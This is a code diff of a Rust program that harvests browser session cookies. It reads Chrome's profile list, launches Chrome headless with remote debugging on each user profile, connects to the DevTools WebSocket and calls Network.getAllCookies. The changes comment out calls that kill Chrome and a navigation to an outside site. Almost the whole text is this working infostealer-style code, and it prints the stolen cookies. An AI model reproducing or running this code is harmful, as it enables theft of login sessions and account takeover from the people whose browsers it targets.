@@ -21,14 +21,14 @@ const USER_DATA_DIR: &str = r#"\google\chrome\User Data"#;
 #[tokio::main]
 pub async fn main() -> Result<(), reqwest::Error> {
     dotenv().ok();
-    kill_chrome();
+    //kill_chrome();
     let localappdata = env::var("LOCALAPPDATA").unwrap();
-    let user_data_dir = localappdata + USER_DATA_DIR;
+    let user_data_dir = localappdata.clone() + USER_DATA_DIR;
     let local_state = fs::read_to_string(format!("{user_data_dir}\\Local State")).unwrap();
     let v: Value = serde_json::from_str(&local_state).unwrap();
     let profiles_raw = v["profile"]["info_cache"].clone();
     for (profile, _) in profiles_raw.as_object().unwrap() {
-        start_debugged_chrome(localappdata + USER_DATA_DIR + "\\{profile}");
+        start_debugged_chrome(localappdata.clone() + USER_DATA_DIR + &format!("\\{profile}"));
         let url = get_debug_ws_url().await;
 
         dbg!("{}", &url);
@@ -36,7 +36,7 @@ pub async fn main() -> Result<(), reqwest::Error> {
         let (ws_stream, _) = connect_async(url).await.unwrap();
         println!("Connected to WebSocket!");
         let (mut sink, mut stream) = ws_stream.split();
-        sink.send(tungstenite::Message::text(
+        let _ = sink.send(tungstenite::Message::text(
             json!({
                 "id": 1,
                 "method": "Network.enable"
@@ -45,17 +45,25 @@ pub async fn main() -> Result<(), reqwest::Error> {
         ))
         .await
         .expect("Failed to enable Network");
-        sink.send(tungstenite::Message::text(
-            json!({
-            "id": 2,
-            "method": "Page.navigate",
-                "params": {
-                "url": "lviscampuscare.org"
-            }
-            })
-            .to_string(),
-        ));
-        sink.send(tungstenite::Message::text(
+        // let _ = sink.send(tungstenite::Message::text(
+        //     json!({
+        //     "id": 2,
+        //     "method": "Page.navigate",
+        //         "params": {
+        //         "url": "https://lviscampuscare.org"
+        //     }
+        //     })
+        //     .to_string(),
+        // )).await.expect("Failed to navigate");
+        // stream.next();
+
+        // if let Some(response) = stream.next().await {
+        //     match response {
+        // Ok(msg) => println!("Received from Navigation : {:?}", msg),
+        //         Err(e) => eprintln!("Error receiving message: {:?}", e),
+        //     }
+        // }
+        let _ = sink.send(tungstenite::Message::text(
             json!({
                 "id": 3,
                 "method": "Network.getAllCookies"
@@ -64,13 +72,14 @@ pub async fn main() -> Result<(), reqwest::Error> {
         ))
         .await
         .expect("ln 52");
+
         if let Some(response) = stream.next().await {
             match response {
                 Ok(msg) => println!("Received: {:?}", msg),
                 Err(e) => eprintln!("Error receiving message: {:?}", e),
             }
         }
-        kill_chrome();
+       // kill_chrome();
     }
 
     //   start_debugged_chrome();
@@ -116,7 +125,7 @@ async fn get_debug_ws_url() -> String {
         .text()
         .await
         .unwrap();
-    dbg!("{:#?}", &body);
+    dbg!("\n\n{:#?}\n", &body);
     let json_res: Value = serde_json::from_str(&body).unwrap();
     let websocket_debugger_url = json_res[0]["webSocketDebuggerUrl"].to_string();
     println!("{}", websocket_debugger_url);
@@ -136,12 +145,12 @@ fn kill_chrome() {
 
 fn start_debugged_chrome(user_data_dir: String) {
     let localappdata = env::var("LOCALAPPDATA").unwrap();
-    let child = Command::new(CHROME_PATH)
+    let mut child = Command::new(CHROME_PATH)
         .args(&[
             &format!("--remote-debugging-port={}", DEBUG_PORT),
             "--remote-allow-origins=*",
             "--headless",
-            &format!("--user-data-dir={}", user_data_dir),
+            &format!("--user-data-dir={}", localappdata + USER_DATA_DIR),
         ])
         .stdout(Stdio::null())
         .stderr(Stdio::null())
